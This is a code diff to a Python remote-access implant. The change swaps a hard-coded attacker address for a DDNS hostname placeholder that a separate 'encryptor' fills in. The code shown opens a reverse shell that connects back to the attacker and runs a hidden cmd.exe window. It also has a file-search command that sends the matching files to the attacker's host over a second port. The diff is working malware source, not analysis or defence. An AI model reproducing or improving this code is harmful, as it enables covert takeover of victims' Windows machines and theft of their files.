@@ -14,7 +14,8 @@ import struct
 import json
 
 # --- DYNAMIC CONFIG ---
-RHOST = "##RHOST##"
+# This HOST value will be replaced by the encryptor with your DDNS hostname.
+HOST = "##HOST##"
 RPORT = ##RPORT##
 # --------------------
 
@@ -118,7 +119,8 @@ def handle_pfiler_command(command, main_conn):
         main_conn.sendall(f"[pfiler] Search complete. Found {len(files_to_send)} files. Initiating transfer.\n".encode('utf-8'))
 
         s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s_file.connect((RHOST, FILE_PORT))
+        # The connection now uses the universal HOST variable.
+        s_file.connect((HOST, FILE_PORT))
 
         try:
             start_msg = json.dumps({'type': 'START_TRANSFER', 'file_count': len(files_to_send)}).encode('utf-8')
@@ -163,7 +165,9 @@ def run_conduit():
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s_obj.connect((RHOST, RPORT))
+            # The connection now uses the universal HOST variable. Python's socket library
+            # will automatically resolve this hostname to the correct IP address.
+            s_obj.connect((HOST, RPORT))
             
             p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
             
